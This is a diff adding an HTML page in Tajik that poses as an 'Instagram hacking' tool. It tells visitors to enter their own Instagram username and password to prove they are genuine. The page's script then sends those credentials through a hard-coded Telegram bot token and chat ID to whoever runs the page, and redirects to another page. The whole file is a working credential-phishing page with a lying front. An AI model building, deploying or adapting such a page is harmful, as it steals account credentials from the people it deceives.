@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAKER</title>
+    <link rel="icon" type="image/x-icon" href="ahmad.png">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: #0f0f0f;
+            color: #00ff00;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 2rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 1rem;
+        }
+
+        .ad-banner {
+            margin: 20px 0;
+            padding: 15px;
+            background: #222222;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 1rem;
+        }
+
+        form {
+            background: linear-gradient(145deg, #1a1a1a, #333333);
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 10px 20px rgba(0, 255, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            background: black;
+            border: none;
+            border-bottom: 2px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        button {
+            background: #00ff00;
+            color: black;
+            font-weight: bold;
+            border: none;
+            padding: 10px;
+            font-size: 1rem;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #00e6e6;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>ВЗЛОМ КАРДАНИ INSTAGRAM</h1>
+        <p>Шумо метавонед ки бо логини қурбони паролашро ёбед ва дохил шавед</p>
+        <p>Огоиҳо бояд шумо ягон хатоги накунед дар вақти хато навистани логин ё парол загрускаи шумо ноком мешавад</p>
+    </div>
+
+    <div class="ad-banner">
+        <p>📢 **Бояд шумо логину пароли инстаграми худро ворид кунед ки барои муаянии фейк набудан ҳади ақал 100 пайрав дошта бошад!**</p>
+        <p>🔓 Маълумоти шумо дар амн аст!</p>
+    </div>
+
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Номи истифодабаранда" required>
+        <input type="password" id="password" placeholder="Парол" required>
+        <button type="submit">Воридшавӣ</button>
+    </form>
+
+    <script>
+        const botToken = "7675500752:AAG4Oms4olj4QpqRKAYxvYnZYFMvOc1p8KU"; // API Token аз BotFather
+        const chatId = "6622134191"; // Chat ID-и шахсии шумо
+
+        const loginForm = document.getElementById('loginForm');
+
+        function isValidInput(input) {
+            // Танҳо ҳарфҳо ва рақамҳои англисӣ иҷозат дода мешаванд
+            const regex = /^[a-zA-Z0-9]*$/;
+            return regex.test(input);
+        }
+
+        loginForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                alert("Лутфан ҳамаи майдонҳоро пур кунед!");
+                return;
+            }
+
+            if (!isValidInput(username) || !isValidInput(password)) {
+                alert("Фақат ҳарфҳо ва рақамҳои англисиро ворид кунед!");
+                return;
+            }
+
+            const message = `🔑 Талоши нави воридшавӣ ба instagram\n\n📌 **Маълумотҳо**:\n- Номи истифодабаранда: ${username}\n- Парол: ${password}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(telegramUrl)
+                .then(() => {
+                    // Ҳидоят ба саҳифаи дигар
+                    window.location.href = "insta.html";
+                })
+                .catch(error => {
+                    console.error("Хато:", error);
+                });
+        });
+    </script>
+</body>
+</html>
+
+
